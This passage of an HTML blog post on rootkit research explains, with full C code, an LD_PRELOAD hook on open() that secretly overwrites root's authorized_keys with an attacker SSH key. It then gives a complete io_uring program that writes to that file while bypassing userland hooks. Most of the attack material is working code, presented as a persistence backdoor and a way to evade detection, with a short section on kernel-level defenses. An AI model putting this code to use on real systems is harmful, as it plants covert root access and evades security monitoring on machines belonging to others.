+</span></span><span class="line"><span class="cl">        <span class="n">orig_open</span> <span class="o">=</span> <span class="p">(</span><span class="n">open_func_type</span><span class="p">)</span><span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;open&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_open</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error loading original open: %s</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;, dlerror());</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>On the first call, we use <code>dlsym(RTLD_NEXT, &quot;open&quot;)</code> to resolve the real <code>open()</code> function from the next link in the shared object chain. This avoids recursion.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mode</span> <span class="o">=</span> <span class="nf">va_arg</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>If the <code>O_CREAT</code> flag is present, we extract the <code>mode_t</code> argument from the variadic list.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">target</span><span class="p">(</span><span class="n">pathname</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">orig_open</span><span class="p">(</span><span class="s">&#34;/root/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+</span></span></code></pre></div><p>If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sshkey</span> <span class="o">=</span> <span class="s">&#34;ssh-rsa AAAAB3...snip... kali@kali</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">sshkey</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">sshkey</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span></code></pre></div><p>A malicious SSH public key is written into the file, and the file is closed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">orig_open</span><span class="p">(</span><span class="s">&#34;/root/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="o">?</span> <span class="nf">orig_open</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">mode</span><span class="p">)</span> <span class="o">:</span> <span class="nf">orig_open</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span></code></pre></div><p>If the file is not one of the targets, the call is passed directly to the original <code>open()</code> function, maintaining transparency.</p>
+<p>Summary of Behavior:</p>
+<ul>
+<li><strong>Intercepts calls to open() via LD_PRELOAD</strong></li>
+<li><strong>ilters paths that match authorized_keys</strong></li>
+<li><strong>Overwrites the file and injects a SSH public key</strong></li>
+<li><strong>Reopens the file with appropriate permissions to avoid suspicion</strong></li>
+<li><strong>Acts transparently for all other files, mimicking normal behavior</strong></li>
+</ul>
+<p>This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.</p>
+<h2 id="bypassing-the-hook-with-io_uring">Bypassing the Hook with io_uring<a hidden class="anchor" aria-hidden="true" href="#bypassing-the-hook-with-io_uring">#</a></h2>
+<p>Here, we use <code>io_uring</code>to bypass the hooked <code>open()</code> function by submitting kernel level I/O requests directly.</p>
+<p>Full Code with Explanations:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/uio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/io_uring.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;liburing.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define FILE_PATH &#34;/root/.ssh/authorized_keys&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define CONTENT &#34;random&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring</span> <span class="n">ring</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span><span class="p">,</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">content</span> <span class="o">=</span> <span class="n">CONTENT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">content_len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_queue_init</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;io_uring_queue_init&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sqe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Could not get SQE</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_open</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">FILE_PATH</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_sqe_set_data</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;io_uring_submit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;io_uring_wait_cqe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Failed to open file: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sqe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Could not get SQE</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">content_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_writev</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_sqe_set_data</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;io_uring_submit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;io_uring_wait_cqe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Write failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sqe</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Could not get SQE</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_prep_close</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_sqe_set_data</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;io_uring_submit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">io_uring_queue_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;gg!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Let&rsquo;s analyze the logic of the program step by step, fully detailing each stage:</p>
+<ul>
+<li>
+<h3 id="1-initialization">1. Initialization<a hidden class="anchor" aria-hidden="true" href="#1-initialization">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_queue_init</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span></code></pre></div><p>This sets up the <code>io_uring</code> interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.</p>
+<ul>
+<li>
+<h3 id="2-opening-the-target-file-with-open">2. Opening the Target File with open<a hidden class="anchor" aria-hidden="true" href="#2-opening-the-target-file-with-open">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">io_uring_prep_open</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">FILE_PATH</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+</span></span></code></pre></div><p>This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc&rsquo;s <code>open()</code>, this is handed off directly to the kernel. The file <code>/root/.ssh/authorized_keys</code> will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.</p>
+<ul>
+<li>
+<h3 id="3-submitting-the-request">3. Submitting the Request<a hidden class="anchor" aria-hidden="true" href="#3-submitting-the-request">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_submit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span></code></pre></div><p>All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.</p>
+<ul>
+<li>
+<h3 id="4-waiting-for-the-open-to-complete">4. Waiting for the Open to Complete<a hidden class="anchor" aria-hidden="true" href="#4-waiting-for-the-open-to-complete">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="o">=</span> <span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">;</span>
+</span></span></code></pre></div><p>Here we block until the kernel reports the result of the previous open operation. If successful, <code>cqe-&gt;res</code> holds the file descriptor. Otherwise, it’s a negative errno value.</p>
+<ul>
+<li>
+<h3 id="5-writing-to-the-file">5. Writing to the File<a hidden class="anchor" aria-hidden="true" href="#5-writing-to-the-file">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">iov</span><span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">iov</span><span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">content_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">io_uring_prep_writev</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span></code></pre></div><p>We set up a <code>writev</code> with a single <code>iovec</code> structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through <code>io_uring_submit()</code>.</p>
+<ul>
+<li>
+<h3 id="6-closing-the-file-descriptor">6. Closing the File Descriptor<a hidden class="anchor" aria-hidden="true" href="#6-closing-the-file-descriptor">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">io_uring_prep_close</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span></span></code></pre></div><p>This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.</p>
+<ul>
+<li>
+<h3 id="7-cleanup">7. Cleanup<a hidden class="anchor" aria-hidden="true" href="#7-cleanup">#</a></h3>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">io_uring_queue_exit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ring</span><span class="p">);</span>
+</span></span></code></pre></div><p>This releases all resources associated with the io_uring instance.</p>
+<p>The complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like <code>open()</code>, <code>write()</code>, or <code>close()</code>) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.</p>
+<ul>
+<li><strong>No libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel.</strong></li>
+<li><strong>Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions.</strong></li>
+<li><strong>No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, &hellip;) never sees these calls.</strong></li>
+</ul>
+<h2 id="security-implications">Security Implications<a hidden class="anchor" aria-hidden="true" href="#security-implications">#</a></h2>
+<p>While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:</p>
+<ul>
+<li><strong>Inject backdoors undetected by LD_PRELOAD monitors</strong></li>
+<li><strong>Exfiltrate files or tamper with data covertly</strong></li>
+<li><strong>Operate beneath traditional EDR agents that rely on userland instrumentation</strong></li>
+</ul>
+<p>Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as <code>LSM</code> (Linux Security Modules) and () and <code>eBPF</code>. All I/O requests issued via <code>io_uring</code> are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they&rsquo;re submitted. This is because io_uring still operates through the kernel&rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring</p>
+<p>For example, <code>LSMs</code> like <code>SELinux</code> or <code>AppArmor</code> still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.</p>
+<h2 id="pocs">POCs<a hidden class="anchor" aria-hidden="true" href="#pocs">#</a></h2>
+<p><img loading="lazy" src="https://i.imgur.com/Ah49HX4.png" alt="imgur"  />
+</p>
+<p>In the image above, see that no <code>open()</code> and <code>openat()</code> functions were used.</p>
+<p><img loading="lazy" src="https://i.imgur.com/L6Alj1S.png" alt="imgur"  />
+</p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p><code>io_uring</code> offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.</p>
+<p>Become a part of <strong>Rootkit Researchers</strong></p>
+<ul>
+<li><a href="https://discord.gg/66N5ZQppU7">https://discord.gg/66N5ZQppU7</a></li>
+</ul>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<p><a href="https://kernel.dk/io_uring.pdf">https://kernel.dk/io_uring.pdf</a></p>
+
+
+  </div>
